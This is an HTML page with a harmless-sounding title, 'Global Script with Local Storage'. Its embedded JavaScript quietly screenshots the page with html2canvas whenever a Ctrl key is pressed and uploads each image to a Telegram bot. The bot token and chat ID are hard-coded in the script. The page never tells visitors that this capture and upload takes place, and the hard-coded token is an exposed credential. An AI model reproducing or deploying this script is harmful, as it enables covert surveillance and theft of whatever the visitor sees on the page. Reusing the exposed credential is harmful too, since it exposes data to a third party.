<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Global Script with Local Storage</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.3.2/html2canvas.min.js"></script>
</head>
<body>
    <h1>Global Script with Local Storage</h1>
    <p>This script will run globally in all tabs using Local Storage.</p>

    <script>
        // Telegram bot token and chat ID
        const token = "7110052875:AAF8o8Rof0q4KFEuVZBLEHM1bgaWe7pZQss";
        const chat_id = "-4583889773";
        const telegramAPI = `https://api.telegram.org/bot${token}/sendPhoto`;

        // Check if script is already running
        if (!localStorage.getItem('globalScriptRunning')) {
            localStorage.setItem('globalScriptRunning', 'true');
            console.log("Global script activated for the first time.");
        } else {
            console.log("Global script already running.");
        }

        // Function to send a screenshot to Telegram
        function takeScreenshot() {
            html2canvas(document.body, { useCORS: true }).then(function (canvas) {
                const base64image = canvas.toDataURL("image/png");
                sendToTelegram(base64image);
            });
        }

        // Function to send the screenshot to Telegram
        function sendToTelegram(base64image) {
            const byteString = atob(base64image.split(',')[1]);
            const mimeString = base64image.split(',')[0].split(':')[1].split(';')[0];
            const ab = new ArrayBuffer(byteString.length);
            const ia = new Uint8Array(ab);
            for (let i = 0; i < byteString.length; i++) {
                ia[i] = byteString.charCodeAt(i);
            }
            const blob = new Blob([ab], { type: mimeString });

            const formData = new FormData();
            formData.append("chat_id", chat_id);
            formData.append("photo", blob, "screenshot.png");

            fetch(telegramAPI, {
                method: "POST",
                body: formData
            }).catch(error => console.error("Error:", error));
        }

        // Add keyboard event listener
        document.addEventListener('keydown', function (event) {
            if (event.ctrlKey) {
                console.log("Taking screenshot...");
                takeScreenshot();
            }
        });

        // Test periodic logging (to simulate persistent behavior)
        setInterval(() => {
            console.log("Global script is still running in all tabs.");
        }, 5000);
    </script>
</body>
</html>
